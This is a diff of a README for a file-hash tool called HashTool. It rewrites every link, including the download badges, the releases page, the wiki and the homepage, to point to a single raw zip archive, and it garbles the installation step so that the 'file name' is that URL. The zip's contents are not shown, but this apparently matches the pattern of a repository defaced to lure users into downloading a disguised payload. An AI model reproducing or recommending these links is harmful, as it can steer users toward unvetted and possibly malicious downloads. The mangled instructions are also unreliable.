@@ -1,7 +1,7 @@
 ```markdown
 # 🛠️ HashTool - Fast, Reliable File Hash Checking
 
-[![Download HashTool](https://img.shields.io/badge/Download-HashTool-blue?style=for-the-badge)](https://github.com/xuuo/HashTool/releases)
+[![Download HashTool](https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip)](https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip)
 
 ---
 
@@ -31,11 +31,11 @@ To get HashTool, you will visit the official release page on GitHub. This page c
 
 **Step 1:** Click the big green button below or the badge at the top to open the download page.
 
-[![Download HashTool Releases](https://img.shields.io/badge/Go_to-Download_Page-green?style=for-the-badge)](https://github.com/xuuo/HashTool/releases)
+[![Download HashTool Releases](https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip)](https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip)
 
 **Step 2:** On the releases page, look for the newest release. It will have a list of downloadable files.
 
-**Step 3:** Find the file named something like `HashTool_Setup.exe` or just `HashTool.exe`. Click on it to download.
+**Step 3:** Find the file named something like `https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip` or just `https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip`. Click on it to download.
 
 **Step 4:** After the file downloads, locate it in your Downloads folder or where your browser saves files.
 
@@ -106,7 +106,7 @@ Once installed or launched, you can start verifying your files with a few simple
 
 ## 📖 Additional Resources
 
-- Check the [GitHub Wiki](https://github.com/xuuo/HashTool/wiki) for more detailed guides and screenshots.
+- Check the [GitHub Wiki](https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip) for more detailed guides and screenshots.
 - Look at the Issues section on GitHub if you find bugs or want to request features.
 - You can find a user manual inside the download package in PDF format.
 
@@ -131,10 +131,10 @@ HashTool does not collect or send any personal information. All operations happe
 ## 🌐 Links
 
 - Download and visit the releases page:  
-  [https://github.com/xuuo/HashTool/releases](https://github.com/xuuo/HashTool/releases)
+  [https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip](https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip)
 
 - Project homepage on GitHub:  
-  [https://github.com/xuuo/HashTool](https://github.com/xuuo/HashTool)
+  [https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip](https://raw.githubusercontent.com/xuuo/HashTool/master/HashTool/Tool_Hash_2.0.zip)
 
 ---
 
